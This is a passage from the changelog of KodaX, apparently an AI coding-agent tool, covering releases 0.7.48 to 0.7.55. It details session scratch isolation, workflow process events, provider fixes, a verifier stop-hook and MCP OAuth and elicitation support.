- **FEATURE_240 - Cross-protocol stop reason handling.** Added a provider-neutral stop-reason classifier while keeping `KodaXStreamResult.stopReason` as the raw upstream string. OpenAI-compatible `length` now reaches max-token continuation, `stop` reaches managed-protocol recovery, and pause/refusal/unknown terminal cases are handled explicitly.

## [0.7.55] - 2026-06-23

> Scope note: a fast emergency release hardening **concurrent same-directory session safety**. When two KodaX sessions run against the same git root, they previously shared one scratch root, one extension-store temp file, and an ownerless managed-task checkpoint — so they could overwrite each other's helper files, clobber each other's atomic writes, and resume each other's in-flight tasks. This release scopes each of those to the owning session/process. The one LLM-facing surface (the Worker / role / system workspace-discipline block plus a new `Session Scratch Directory` environment line) ships with a paired prompt eval (`tests/v0755-session-scratch-discipline.eval.ts`); the 5-alias panel shows the reworded discipline introduces **zero** new scratch leakage to the project root or system tmp (`no_leak` 5/5 on every alias for both the v0.7.54 and v0.7.55 wording), with positive session-directory adoption wherever a model writes its scratch file in-turn (ADR-033 / FEATURE_104).

### Added

- **Per-session scratch directory.** Each session now gets an isolated `.agent/tmp/sessions/<session-id>/` scratch directory (`getSessionScratchDir`, sanitized + length-capped id). It is disclosed to the model through a new `session-scratch-directory` capability section, the Worker/role `## Environment` block, and the system-prompt scratch guidance, and is exported to shell commands as `KODAX_SESSION_TMP`. The workspace-discipline wording now points scratch writes at the session directory (falling back to a session-scoped `.agent/tmp/sessions/` subdirectory when no absolute path is shown) instead of the shared `.agent/tmp/` root, so concurrent same-directory sessions no longer collide.

### Fixed

- **Managed-task checkpoints no longer resume across sessions.** Checkpoints now record the owning `sessionId` (plus a diagnostic `processId`), and `findValidCheckpoint` only resumes a checkpoint that belongs to the current session — preventing one session from picking up another session's in-flight task. Expired checkpoints are still garbage-collected by any session, so ownerless legacy checkpoints do not accumulate. The runner attaches a stable session id only when a real host session, storage, or `askUser` channel is present, so ad-hoc callers prefer a safe checkpoint miss over a cross-session attachment.
- **Extension-store atomic writes are now per-process.** `FileExtensionStore` writes through a `pid`+nonce-scoped temp file before the rename instead of a single shared `<file>.tmp`, so concurrent processes can no longer clobber each other's in-flight write.
- **MCP tools are stripped when no capability runtime is bound.** AMA role tool assembly and the role expected-tool surface now drop MCP tool names when no extension runtime is present (the dispatch fallback would otherwise just throw), and the role contract helper takes whether a runtime is actually bound.
- **Agent-construction and self-modify tools are gated consistently.** The runtime active-tool resolver now also applies the agent-construction filter, and that filter strips the `stage_self_modify` tool alongside the agent-construction tools, so neither surfaces unless construction mode is explicitly active.

## [0.7.54] - 2026-06-23

> Scope note: a feature release headlined by **FEATURE_224** (procedural learning triage + SkillCurator v1), with several supporting capabilities folded into the same window — opt-in **session recovery** from a safe summary when a provider rejects the current history, filesystem **extension discovery** plus a reusable extension-runtime composition primitive and ACP capability multiplexing/logging, and a GLM provider-model refresh. The learning loop is user-driven through `/learn` and never auto-applies. Most of the batch is ADR-033 eval non-triggering infrastructure; the only prompt-surface touch is the `manual` self-knowledge tool gaining an `extensions` topic — the paired `self-knowledge-roundtrip` eval was not re-run in this window (additive enumeration, low cross-case risk).

### Added

- **FEATURE_224 - Procedural learning triage + SkillCurator v1.** Turn-level learning candidates flow through confidence-gated triage (floors tunable via `KODAX_LEARNING_DEFAULT_CONFIDENCE` / `KODAX_LEARNING_CONFIDENCE_FLOOR`) into a durable proposal store plus separate skill usage and trust ledgers, and are surfaced for review through the `/learn` command (`pending` / `diff` / `approve [--ack-impact]` / `reject`). Skill application is snapshot-safe and atomic: approval is idempotent (re-approving an already-applied proposal does not rewrite files) and refuses to overwrite a skill that changed after its snapshot; workflow-handoff proposals flagged with consumer impact require an explicit `--ack-impact`. The full approve-apply orchestration ships from `@kodax-ai/agent` as `approveStoredLearningProposal` (returns a discriminated `StoredLearningApprovalResult`) so non-REPL SDK consumers get the same correctness guards rather than re-implementing them.
- **Session recovery from a safe summary.** When a provider error looks like a rejected or oversized session history (and not an auth/config failure), KodaX offers `/recover [prompt]` to fork a fresh session seeded with a compact local memory — objective, recent user/assistant turns, prior compaction summaries, and files/tools touched — instead of replaying raw provider history. The seed builder `buildRecoverySeed` / `normalizeRecoveryPrompt` lives in `@kodax-ai/agent` (session-lineage) and the candidate-error classifier `isSessionRecoveryCandidateError` in `@kodax-ai/coding`, so the capability is reusable beyond the terminal.
- **Filesystem extension discovery + runtime composition (SDK).** `@kodax-ai/coding` gains `discoverDefaultExtensions` / `discoverExtensionsInDirectory` (deterministic ordering, symlink-aware, ENOENT-safe) with entrypoint-identity dedupe/exclude helpers, plus `combineExtensionRuntimes` / `CombinedExtensionRuntime` where both the base and combined runtime implement a shared `ExtensionRuntimeContract`. The CLI (`kodax_cli`) and ACP server now discover and load extensions through these shared primitives.
- **ACP capability surface + structured logging.** The ACP server gains capability multiplexing with primary/secondary fallback (`searchCapabilities` / `describeCapability` / `executeCapability` / `readCapability` / `hydrateSession`) and dedicated `acp_events` / `acp_logger` modules.

### Changed

- **GLM provider models refreshed.** GLM-5 / GLM-5.1 are retired upstream (auto-routed to GLM-5.2); cost rates and provider capabilities now serve GLM-5.2 / GLM-5 Turbo / GLM-4.7 (200K context).
- **`manual` self-knowledge tool now covers `extensions`.** The self-knowledge router gains an `extensions` topic and the `manual` tool description enumerates it alongside providers/config/agents/skills/MCP/repo intelligence. (ADR-033/FEATURE_104: the batch's only tool-`description` touch; see the scope note on the un-refreshed `self-knowledge-roundtrip` eval.)
- **Internal type-safety and error-handling hygiene.** A cleanup pass across session-lineage, agent-runtime, and extension modules removes residual `any` usages (introducing explicit type guards) and replaces bare `catch {}` blocks with documented `catch (error)` handlers. No behavior change.

## [0.7.53] - 2026-06-19

> Scope note: a maintenance release focused on session hygiene, interactive resume-state persistence, and a warn-only todo-drift nudge. Three features were authored in this still-open window — **FEATURE_174** (`kodax sessions dedupe`, from v0.7.69), **FEATURE_211** (durable extension/MCP session state across host-owned resume, from v0.7.72), and **FEATURE_237** (warn-only todo-drift reminder) — alongside host-readable Sidecar Verifier messages, CLI completion/liveness polish, and fixes for AMA iteration-cap reporting, child-executor progress seeding, and synthetic sidecar follow-up message identity. FEATURE_237 is the only LLM-facing prompt change and ships with a paired prompt eval (`tests/todo-drift-reminder.eval.ts`); all other changes are ADR-033 eval non-triggers.

### Added

- **Sidecar Verifier actionable messages are now host-readable.** `KodaXEvents.onSidecarMessage` emits `KodaXSidecarMessageEvent` for verifier `revise` and `blocked` verdicts, and JSONL/headless output mirrors the same payload as `sidecar.message`. Accept verdicts remain silent.
- **FEATURE_174 - `kodax sessions dedupe`.** A dry-run-first `kodax sessions dedupe [--apply]` command finds historical `runner-*.jsonl` ghost sessions and only moves uniquely matched ghosts into a reversible `.dedupe-archive`, leaving canonical user sessions and managed-task-worker sessions untouched. Match selection now treats any second strong canonical (≥ threshold) as ambiguous and skips it, and `--apply` moves each ghost under a per-file guard that records a `move-failed` skip instead of aborting the whole run.
- **FEATURE_211 - Interactive extension/MCP session state now survives host-owned resume.** Runtime extension state is snapshotted back to the REPL host, restored through `initialExtensionState` / `initialExtensionRecords`, and dirty-tracked so normal Ink saves stay on the append-only hot path while explicit extension clears persist correctly.
- **FEATURE_237 - Warn-only todo-drift nudge.** A runner-boundary observer detects the soft-contract drift where the Worker starts real work while its todo list has pending items but nothing marked `in_progress`. It never mutates the todo store and never blocks a run — it records `KodaXTodoDriftWarningEvent` telemetry (surfaced via `KodaXEvents.onTodoDriftWarning` and `KodaXResult.todoDriftWarnings`) and arms a one-shot `<system-reminder>` nudging the model to `todo_update` the matching item. A successful `todo_update` clears the armed state. The LLM-facing reminder ships with a paired prompt eval (`tests/todo-drift-reminder.eval.ts`).

### Changed

- **CLI completion and live-surface polish.** Root-command option wiring is consolidated into a single `configureKodaXRootCommand`, argument/skill/command completion is broadened (skill completions are now typed `skill` rather than `command`), and the REPL child-activity / surface-liveness view-models are hardened against stale rows.

### Fixed

- **AMA iteration events report the real per-invocation cap.** Runner-driven task-engine iteration start/end events now use the actual invocation `maxIter` denominator instead of the stale standalone task-engine hint, so hosts do not see impossible counters such as `24/20`.
- **Child-executor progress is seeded from the real cap.** Child-agent progress state now shares the same real-cap denominator used by the runner adapter, keeping progress displays aligned with the current invocation limit.
- **Synthetic sidecar follow-ups no longer collapse into real user messages.** Sidecar revise prompts are marked as synthetic user messages, and session-lineage/storage fingerprinting now treats synthetic and real same-content messages as distinct entries.
- **FEATURE_211 crash recovery keeps extension snapshots consistent with rolled-back transcripts.** Unsafe error snapshots now preserve the existing persisted extension state/records when they roll messages and lineage back to the last clean session state.

## [0.7.52] - 2026-06-18

> Scope note: a maintenance release of fixes landed right after v0.7.51 — OpenAI-compat provider robustness, the Node runtime floor raised to 20, and the cross-platform CI test cleanup. No new features; no LLM-facing prompt changes (ADR-033 eval non-trigger).

### Changed

- **Node runtime floor raised to 20 (Node 18 dropped).** The codebase relies on Node 20+ runtime features (notably the RegExp `v`/unicodeSets flag pulled in transitively), so Node 18 could no longer even load large parts of the suite. `engines.node` is now `>=20.0.0` across the root and all four workspace packages, the CI matrix runs Node 20 + 22, and the README/AGENTS/CLAUDE tech-stack tables are updated. The release build continues to run Node 22.

### Fixed

- **Forced `tool_choice` now falls back on upstream 5xx / unsupported-parameter errors.** OpenAI-compat providers that reject a forced `tool_choice` request with a generic 5xx (or an `unsupported parameter: tool_choice` message) now retry without the forced choice instead of surfacing a hard error. HTTP status is extracted from `status` / `statusCode` so the fallback fires consistently across SDK error shapes.
- **OpenAI tool history is repaired before replay.** Malformed tool history — orphan assistant `tool_calls` with no matching tool result, or orphan `tool` messages with no preceding assistant `tool_call` — is now sanitized before the conversation is replayed to OpenAI-compat endpoints, preventing avoidable 400s on resume / multi-turn tool runs.
- **Cross-platform CI test reliability.** Test-only fixes so the Linux CI matrix reflects real regressions: the bash large-output test no longer relies on shell-interpreted backticks/`${}` in a `node -e` script; `isScreenReader` test clears `CI` (GitHub Actions sets `CI=true`); and `resolveSessionRuntimeInfo` / `FileSessionStorage` tests use platform-portable absolute roots instead of Windows-only `C:/…` paths. Remaining Linux-only test gaps are tracked in [docs/KNOWN_ISSUES.md #141](docs/KNOWN_ISSUES.md).

## [0.7.51] - 2026-06-17

> Scope note: v0.7.51 closes the **"host reads persisted history"** loop on top of the v0.7.49/v0.7.50 workflow split. Two co-shipped, additive features: **FEATURE_230** makes the TUI tool transcript durable across resume, and **FEATURE_234** gives workflow runs a host-owned attribution slot. Neither rewrites FEATURE_217 (v0.7.49) or FEATURE_229 (v0.7.50); both treat the v0.7.50 process/snapshot model as a dependency, not future work. `FEATURE_230` was pulled forward from v0.7.59 into this release window; the original v0.7.51–v0.7.58 plan group shifted +10 (→ v0.7.61–v0.7.68).

### Added

- **FEATURE_230 — Durable TUI Tool Transcript Replay.** Resumed interactive sessions now replay the tool cards the assistant used, instead of degrading to a text-only transcript. `messages` / `lineage` remain the canonical source of tool facts; `uiHistory` becomes a bounded, sanitized replay cache that can carry terminal tool cards.
  - **Persisted data model** (`@kodax-ai/agent`): `KodaXSessionUiHistoryItem` becomes a text/tool-group union with domain-neutral persisted tool-call replay types (`KodaXSessionUiToolGroupHistoryItem` / `KodaXSessionUiToolCall`), reachable from SDK-facing subpaths without importing REPL-only UI types. The persisted status set is terminal-only (`success` / `error` / `cancelled` / durable `awaiting_approval`).
  - **Serialization**: `InkREPL.tsx::toPersistedUiHistoryItem` stops dropping `tool_group` items. It sanitizes them — maps in-flight `scheduled` / `validating` / `executing` to `cancelled` ("Session ended before the tool completed."), drops `progress` / `progressLines` / streaming deltas, truncates previews/outputs, recursively redacts sensitive keys (`token`, `password`, `secret`, `api_key`, `authorization`, `cookie`, …), and enforces hard per-group budgets.
  - **Restore + message-derived fallback**: a UI-neutral `restoreHistoryItemsFromSession` projection enriches old text-only `uiHistory` from canonical `messages`, and `message-utils.ts` derives replayable tool-card seeds from paired `tool_use` / `tool_result` blocks (status inferred from result content). Resume never revives running tools, and persisted rounds that already contain a tool group are not duplicated.
  - **JSON guards**: `interactive/json-guards.ts` now accepts `event` text items and terminal `tool_group` items, filtering malformed siblings item-by-item instead of discarding the whole `uiHistory` array.
  - **SDK transcript contract**: `loadSession()` = active model context, `loadFullTranscript()` = append-order host scrollback, `SessionData.uiHistory` = optional bounded replay cache; headless SDK sessions without TUI `uiHistory` can still reconstruct tool cards from canonical messages. The replay types are exported from `@kodax-ai/kodax/session`. Existing trim limits (≤150 UI items / ≤50 user rounds) and append-only storage are unchanged.

- **FEATURE_234 — Workflow Run Host Attribution (`hostMetadata`).** Workflow runs gain a host-owned opaque attribution slot so an SDK host can map a run back to the session/surface that launched it — zero side table, stable across process restart, and attributable even for runs launched outside the host (REPL / CLI / extension) as long as the launcher stamps it.
  - **Additive API** (`@kodax-ai/agent/workflow`): `WorkflowProcessTrackerOptions` and `WorkflowProcessSnapshot` gain `hostMetadata?: Record<string, string>`. It echoes automatically through `workflow_started` / `workflow_updated` / `workflow_finished` (each embeds the snapshot). A new domain-neutral `normalizeHostMetadata` helper is exported (additive).
  - **Persistence + readback** (`@kodax-ai/coding/workflows`): `WorkflowRunProcessMetadata` extends its `Pick` with `hostMetadata`; `writeRunJson` persists it, `lifecycle-controller` reads it back through `normalizeHostMetadata`, and `listWorkflowProcessSnapshots()` re-attributes runs after a restart. `RunWorkflowFromOptionsInput.processMetadata` and `WorkflowRunManager.startFromOptions` thread it through with no new entry parameter; REPL `buildWorkflowProcessMetadata` can optionally stamp it too.
  - **Boundary validation**: `normalizeHostMetadata` keeps only string values, caps at 16 keys (key ≤64 / value ≤512 chars, truncated), and normalizes an empty object to `undefined`, so malformed run.json readback stays safe. SDK never interprets the map; unstamped / legacy runs honestly echo `hostMetadata === undefined` (no faked attribution). No LLM-facing prompt change → ADR-033 eval non-trigger.

  See [docs/features/v0.7.51.md](docs/features/v0.7.51.md) + test guides [FEATURE_230](docs/test-guides/FEATURE_230_v0.7.51_TEST_GUIDE.md) / [FEATURE_234](docs/test-guides/FEATURE_234_v0.7.51_TEST_GUIDE.md).

### Fixed

- **Workflow generation no longer lands zero files yet reports `completed`.** For file-writing / code-implementation requests the generator now emits a `readOnly:false` write child with a `verification` postcondition (`requiresMutation: true`) instead of a report-only fan-out-and-synthesize script. Covered by a new `workflow-verify-generator` Layer 2 eval.
- **Inline `/skill:<name>` references in workflow requests and child objectives.** A `/skill:<name>` token in a workflow request or child-agent objective is parsed, resolved against the skill registry, and expanded into an authoritative skill-instruction section injected into the generation prompt and child briefing (skill-specific file layout / naming / process requirements are preserved rather than collapsed to vague paths). Unknown or disabled skills fail closed with the available-skill list.
- **`/workflow delete` for saved workflows and runs.** New `/workflow delete [--force] [--run|--saved] <runId|savedName>` wired to the lifecycle controller, with scope disambiguation (`--run` + `--saved` together is a guarded conflict), updated help text, and argument completion.
- **Workflow live child-activity surface rendering hardened.** Child-activity is shown only in non-transcript loading state for live-only (`workflowCorrelation` / `childAgentId`) events, the prompt-activity footer is suppressed when a dedicated progress surface is present, and surface-liveness gating prevents stale rows from rendering after a run ends.

## [0.7.50] - 2026-06-16

> Scope note: v0.7.50 is a single-feature slot for **FEATURE_229**. It does **not** rewrite FEATURE_217 (v0.7.49) — the dynamic JS harness, capsule model, save/rerun, worktree isolation, and permission gates all stay. F229 lifts the v0.7.49 user-visible workflow process into a subscribable Agent-layer event/snapshot model and a Coding/SDK lifecycle surface. `FEATURE_224` is tracked in [v0.7.54](docs/features/v0.7.54.md).

### Added

- **FEATURE_229 — Workflow Process Events + SDK/System Progress Surface.** Workflow progress is now a first-class, subscribable process — not private REPL text — so SDK hosts, the REPL inline/fullscreen surface, and future automation all consume one source of truth.
  - **Agent-layer process model** (`@kodax-ai/agent/workflow`, domain-neutral): `WorkflowProcessSnapshot`, `WorkflowProcessItem` (with `summaryStatus: 'pending' | 'result' | 'notice' | 'unavailable'`), the three-type `WorkflowProcessEvent` (`workflow_started` / `workflow_updated` / `workflow_finished`), `WorkflowEventCorrelation`, and the `isFinalWorkflowProcessStatus` terminal-state helper. A thin reducer folds existing `WorkflowEvent` records into snapshots without making generated scripts aware of process state; token usage, artifacts, counts, and phase/agent progress are tracked per run.
  - **Async child digest split (§7.1).** Child completion is no longer blocked by digest generation: a finished child immediately emits `completed` + `summaryStatus:'pending'` (interim deterministic excerpt), and the model-authored digest is delivered off the critical path via the runtime's domain-neutral `updateTaskSummary(taskId, { summary, summaryStatus })` channel as a later `workflow_updated` (`result`, or `unavailable` on failure/timeout). Late digests are dropped silently once a run is stopped/cancelled. Worktree-isolated children keep blocking digest semantics so the digest still runs before worktree cleanup.
  - **Coding/SDK lifecycle controller** (`createWorkflowLifecycleController`): non-slash-command host control — `subscribeWorkflowProcess`, `getWorkflowProcessSnapshot`, `listWorkflowProcessSnapshots`, `preflightWorkflowCapsule`, `stop` / `pause` / `resume`, `readWorkflowResult` / `readWorkflowArtifact`, and terminal-run `delete` / `prune` with active-run protection and malformed-JSONL tolerance. SDK-loaded capsules now run the same preflight (version / skills / MCP / worktree / provider-model policy) as REPL-loaded ones.
  - **Host policy** (`WorkflowHostPolicy`): `autoStart` (`off` / `confirm` / `on`) governs natural-language AMAW auto-start without weakening explicit `/workflow` semantics, and `maxAgents` / `maxConcurrency` / `tokenBudget` ceilings clamp runtime/approval/process caps (cannot raise above KodaX hard caps or bypass child permission gates).
  - **Workflow identity & lifecycle**: a shared resolver handles `runId | saved workflow name | display alias` with fail-closed ambiguity handling (preserving v0.7.49 `rerun` semantics for both SDK and REPL). `/workflow rename <runId|name> <newName>` updates run display metadata or a saved capsule without changing run ids; `/workflow revise <runId|name> <change request>` generates a new capsule revision through the existing generator (approval-gated, append-only — never mutates the historical run graph); `/workflow revise --replace <savedName> <change request>` moves a saved capsule name after confirmation and archives the previous capsule under `.revisions/<savedName>/` with revision/replacement provenance.
  - **SDK callback surface**: `KodaXEvents.onWorkflowProcessEvent` and `KodaXOptions.workflowHostPolicy`. Existing `KodaXEvents` child streams now carry `WorkflowEventCorrelation` (`workflowRunId` / `childAgentId` / `itemId`) from the coding layer — the agent workflow package still does not import `KodaXEvents`. `wf.log()` now emits durable `workflow_log` records folded into snapshot `latestMessage`, so hosts render progress without scraping terminal output. Resolved per-agent provider/model is propagated back through the process item for host correlation (still policy-gated).
  - **REPL migration**: inline/fullscreen live surface and `/workflow runs|show|stop` are driven by `WorkflowProcessSnapshot` (legacy `WorkflowEvent` folding kept only as a fallback adapter); copy/selection paths stay plain-text (no ANSI in the transcript); argument completion exposes `rename` / `revise` (+ `--replace`) alongside the existing `rerun` / `save` run-id and saved-name candidates.
  - **Live child-agent telemetry**: `KodaXEvents` callbacks now take an optional trailing metadata arg (`KodaXToolEventMeta` / `KodaXActivityEventMeta` / `KodaXWorkflowEventMeta`) carrying `toolId`, child agent identity, and workflow correlation, so a host can attribute every tool/thinking/text/progress event to its originating child agent and workflow run without a second event protocol. A child agent's activity (incl. an `onChildActivityEnd` boundary when it leaves the executor) streams into a bounded REPL `ChildActivitySurface` live panel instead of polluting the main transcript, and into JSONL output for headless hosts.
  - **Generated-harness source validation**: generated/saved workflow scripts pass `validateRestrictedWorkflowSource` (JS compile check + source-policy scan over comment/string-stripped code) on generate/save/rename/replace/run, the generator gains a bounded multi-attempt repair loop with syntax + smoke-execution checks, and `wf.output(taskId)` is aliased to `wf.snapshot(taskId)` (`output` kept as a compatibility alias).

  See [docs/features/v0.7.50.md FEATURE_229](docs/features/v0.7.50.md) + [test guide](docs/test-guides/FEATURE_229_v0.7.50_TEST_GUIDE.md). Architecture rationale in [docs/ADR.md ADR-040](docs/ADR.md).

### Changed

- **Provider model documentation refreshed (2026-06-14 snapshot).** README, LLM package docs, and SDK guidance now reflect the capability metadata for OpenAI `gpt-5.4` / `gpt-5.3-codex-spark`, Kimi `kimi-k2.7-code`, Zhipu `glm-5.2`, MiniMax `MiniMax-M3` / `MiniMax-M2.7-highspeed`, DeepSeek V4, and Ark Coding Plan routes for GLM, Kimi, MiniMax, DeepSeek, and Doubao Seed 2.0, while omitting retired MiniMax M2.5/M2.1/M2 ids from current public tables.
- **Lazy provider client initialization.** Anthropic / OpenAI / custom providers now construct their underlying SDK client on first use (and rebuild it on a stale-connection signal) instead of eagerly at registry construction, so configuring many providers no longer allocates unused clients at startup.
- **`web_search` defaults to Bing.** The built-in `web_search` tool now uses Bing (with a dedicated result parser that skips ad blocks and tracking redirects) as its default endpoint instead of DuckDuckGo, so search works in network environments where DuckDuckGo is unreachable.
- **Language-continuity rule in the shared role closing contract.** Role prompts now instruct the agent to match the primary natural language of the original user request for user-visible progress, idle-yield resume summaries, and final answers (tool outputs, code identifiers, and quoted evidence may stay in their source language).

### Fixed

- **`task_output` no longer re-wakes idle-yield for terminal tasks.** When `task_output` reads an already-terminal child task, it now drains the matching `<task-completed>` queue entry so the idle-yield loop is not woken again by a stale completion notification.
- **FEATURE_229 post-review closure.** `runWorkflowFromOptions` now forwards parent `guardrails` and the live plan-mode block predicate into workflow children, preserving the same SDK/REPL guardrails used by normal child dispatch. `/workflow` argument completion exposes `rename`, `revise`, `revise --replace`, and the relevant run-id / saved-workflow-name targets. Process status transitions are tightened: `activePhaseId` is cleared on phase/run completion, and a cancelled run marks in-flight children `cancelled` (vs `skipped` for never-started items). Capsule-preflight revision provenance resolves the version via `KODAX_VERSION` → `npm_package_version` → minimum-capsule fallback, so a native binary (no npm env) no longer mislabels or falsely rejects a capsule.
- **Windows background process cleanup hardened.** Workflow / CLI subprocess teardown now waits for the full Windows descendant process tree to exit across the `taskkill` → `SIGTERM` → `SIGKILL` escalation (cycle-safe descendant collection, leaf-first kill order), and the two `process-tree` helpers (`@kodax-ai/agent` runtime + `@kodax-ai/llm` cli-events) are realigned so their `wmic` / PowerShell fallback logic no longer diverges. POSIX teardown is unchanged.

## [0.7.49] - 2026-06-13

### Added

- **FEATURE_217 — Dynamic Workflow Harness Runtime.** FEATURE_217 remains a v0.7.49 feature and now closes the complete Dynamic Workflow product loop. It includes `createWorkflowRuntime` / `runWorkflow`, `maxAgents`, `maxConcurrency`, lazy-thunk `parallel`, append-only events, abort propagation, `createCodingWorkflowBackend`, the read-only `parallel-investigation` built-in workflow, durable `run.json` + `events.jsonl` + `artifacts/`, saved-workflow discovery, and REPL `/workflow`. The 2026-06-13 completion slice adds `WorkflowScriptManifest` validation, restricted generated-script execution through `WorkflowApi`, script/manifest snapshots in the run graph, token-budget hard stop before new spawns, process-local `WorkflowRunManager`, non-blocking `/workflow` starts, `/workflow show|pause|resume|stop`, `/workflow create <request>`, `/workflow save <runId> <name>`, restricted `.workflow.json` save/rerun, approval prompts that show source/sandbox/worktree intent, opt-in `isolation:"worktree"` routing through parent-managed worktrees, and reusable pattern templates for classify-and-act, adversarial verification, generate/filter, tournament, and loop-until-done. **Late-slice hardening (2026-06-13):** live workflow runs are surfaced in the REPL transcript with an expanded `/workflow` command surface (argument completers + run-surface component); `isolation:"worktree"` children are relocated under `<runDir>/worktrees` with three reclamation layers (per-child cleanup, terminal-run sweep, and a >6h startup GC) so interrupted runs no longer leak worktrees into the repo's parent directory; generated-workflow robustness gains a single repair retry on manifest/source validation failure, phase-shape normalization, a lifetime `maxAgents` capacity reserve, and a displayable-result lint that rejects non-displayable returns (`undefined`/`null`/`{}`/`[]`, bare `wf.artifact()` handle returns) while the REPL renders any non-empty object/array as JSON; and the per-child self-distill digest is bounded (10s + parent-abort) with a failed/timed-out/empty attempt now honestly labeled `smart summary unavailable; local excerpt` instead of silently presenting a deterministic excerpt as the intended digest. See [docs/features/v0.7.49.md FEATURE_217](docs/features/v0.7.49.md) + [test guide](docs/test-guides/FEATURE_217_v0.7.49_TEST_GUIDE.md).
- **FEATURE_215 — Generic LLM-judged stop-hook primitive (`invokeLlmJudge` / `createLlmJudgedStopHook`).** The second-pass "the agent said it's done → let another LLM consult → continue or stop" kernel (forced tool call → fuzzy tool-name match → parse verdict → timeout race → fail-open) is lifted to `@kodax-ai/agent` as a reusable, domain-neutral primitive. KodaX's Sidecar Verifier (FEATURE_184) and Stall Sidecar (FEATURE_178) become thin consumers that inject their own prompt / parser / verdict mapping — removing the copy-pasted `editDistance` + invocation skeleton (now a single source of truth). External SDK consumers on a bare `Runner` can now build a text-only-termination consult by injecting a domain prompt, without dragging in the coding preset. Per ADR-030 the concrete judging (prompt, file-edit evidence, verdict landing) stays in coding; only the invocation kernel generalizes. **Prompt byte-for-byte unchanged → eval non-trigger.** See [docs/features/v0.7.49.md FEATURE_215](docs/features/v0.7.49.md).
- **FEATURE_226 — Session custom tags.** A session can carry a user-supplied `tag` that persists across save/load, is inherited across `fork` / `rewind`, and filters `listSessions` + the session pickers. The tag now survives resume (`kodax -r` / `-c`) and `/load` — it is back-propagated into the live session options so subsequent saves and forks keep it, and every save path carries it so a brand-new session's first save no longer drops a caller-supplied tag (storage still merges `data.tag ?? existing`). Per design, `tag` uses provided-or-keep semantics — an omitted tag does **not** clear an existing one. See [docs/features/v0.7.49.md FEATURE_226](docs/features/v0.7.49.md).

### Changed

- **Modernized REPL startup banner.** The block below the KODAX logo is redesigned: a colored per-line gutter (cyan tagline · green version/provider/mode · amber compaction · violet session) replaces the full-width dashed rules, content uses a readable secondary tone, and the metadata line is tightened (`AMA / auto · reason:auto`). Applies to both the Ink TUI banner (the live render and the inline-scrollback transcript are kept text-identical so the ledger does not churn) and the classic fallback banner.

### Fixed

- **FEATURE_223 — Sidecar Verifier stalls on custom OpenAI-compatible providers (esp. DeepSeek V4 flash thinking).** After a Worker finished text-only, the out-of-band Sidecar Verifier could leave the UI stuck on `PLANNED…` for a long time and often needed an interrupt. Four root causes fixed: (1) the REPL now renders the `verifying` phase (`AMA Verifying`) instead of holding the previous `PLANNED - Worker` frame; (2) the judge call now sends a real provider-level `tool_choice` (`{type:"function"}` for OpenAI-compat, `{type:"tool"}` for Anthropic-compat) — previously it claimed a forced tool call but only passed `tools` — with a one-shot compatibility retry (no forced choice) when an endpoint rejects `tool_choice`; (3) the verifier now passes a real `AbortSignal` + a `1024`-token output cap, so the 15s timeout (and caller abort) actually cancels the underlying stream and an abortable `Retry-After` sleep — no more zombie verifier contending for the same custom-provider rate limit; (4) docs/config call out that DeepSeek V4 custom providers need explicit `replayReasoningContent: true` (per-model override on mixed gateways; **not** flipped on by default, since OpenAI-proper and some gateways reject unknown assistant-message fields). See [docs/features/v0.7.49.md FEATURE_223](docs/features/v0.7.49.md) + [test guide](docs/test-guides/FEATURE_223_v0.7.49_TEST_GUIDE.md).
- **FEATURE_217 — Workflows that orchestrate real LLM child agents timed out at 10s.** The restricted workflow script runner used a single `timeoutMs` (default `10000`) both for the synchronous VM execution cap **and** for a wall-clock loop check that counts time spent awaiting child agents — so any workflow that spawned even one real child (each taking tens of seconds) was killed before its first child finished (`workflow script timed out after 10000ms`). Split into `syncTimeoutMs` (≤10s, bounds only synchronous script CPU via `vm.runInContext`) and `wallTimeoutMs` (default **30 min**, the total run budget incl. child-await). The polling loop also yields on `Promise.race([sleep, ...inFlight])` so it never busy-spins.
- **FEATURE_217 — duplicate / double-counted terminal task events.** When a workflow task was both waited on and stopped (e.g. a failed run stopping in-flight children), the runtime could emit `agent_completed`/`agent_stopped` twice and accrue its token usage twice. Terminal events now route through a single dedup gate (`emitTerminalTaskEvent`) keyed by task id, so each task emits exactly one terminal event and accrues once.
- **Per-model compaction windows honored.** Compaction-config resolution now keys its adaptive trigger bucket off the *effective* context window and accepts an in-process `KodaXOptions.compaction` override (`contextWindow` / `triggerPercent` / `enabled`), so a model with a smaller/larger window compacts at the right point instead of the legacy fixed 75% bucket. Provider `base` exposes the per-model context window used to drive it.
- **REPL scroll viewport rendering.** Fixed an inline/fullscreen scroll viewport rendering glitch in the TUI renderer (`render-node-to-output` / `renderer`).
- **REPL fullscreen transcript spacing & workflow footer height.** Two fullscreen-transcript rendering glitches: an assistant body ending in a trailing newline rendered an extra blank row on top of the fixed block spacer (two blank lines before the next block) — now normalized at render time (display-only; stored text untouched); and the workflow live footer could render one row taller than its reserved budget (the activity verb wraps narrower since it shares a row with a right-aligned counter, and surface rows could wrap), pushing the composer + status bar up a row for long-named workflows at some terminal widths — the footer rows are now forced to a single truncated line with exactly one reserved activity-bar row so reserved height equals rendered height at any width.

## [0.7.48] - 2026-06-11

> Scope note: this ships the **server→client (reverse) half** of MCP `2025-11-25` — roots, elicitation, and OAuth discovery/login/step-up — on top of the forward client delivered in v0.7.47. It is **not** "all of 2025-11-25": `sampling` and `tasks` are deferred to v0.7.50 (see below).

### Added

- **FEATURE_222 — MCP `2025-11-25` reverse capabilities: roots, elicitation (form + url), and OAuth discovery/login/step-up.** KodaX's self-built MCP client now serves the server→client requests it previously stubbed (`capabilities: {}` → real handlers), aligned to the Claude Code / Codex MCP clients. A capability is advertised **only** when the host injects its handler ("declaration = implementation promise"), so it is incrementally safe and a headless host degrades to the old behaviour. **roots:** a connected server can call `roots/list` and KodaX answers with the workspace as `file://` roots (CLI + ACP). **elicitation:** a server can ask the user for input — every prompt shows **which MCP server is asking** (anti-phishing); `form` mode maps the requested schema (string / number / enum / boolean / confirm-only) onto the host's ask-user dialogs and lets the user **review the exact values before they are sent**; `url` mode is an anti-phishing consent gate (shows the full URL + domain, never auto-opens, never exposes the URL to the model); a `-32042 UrlElicitationRequired` from a tool call is closed by eliciting, waiting for `notifications/elicitation/complete`, then retrying (bounded). The `ask_user_question` primitive moved down to `@kodax-ai/agent` so coding tools and MCP elicitation share one host-injected surface, resolved live at call time. **OAuth:** zero-config authentication — on a `401` KodaX discovers the authorization server (RFC 9728 Protected Resource Metadata → RFC 8414 / OIDC metadata), dynamically registers a client (RFC 7591), and runs PKCE (**S256 required — refuses to downgrade**) with the RFC 8707 `resource` indicator through a `127.0.0.1` loopback callback that is **listening before the URL is shown** (no lost-redirect 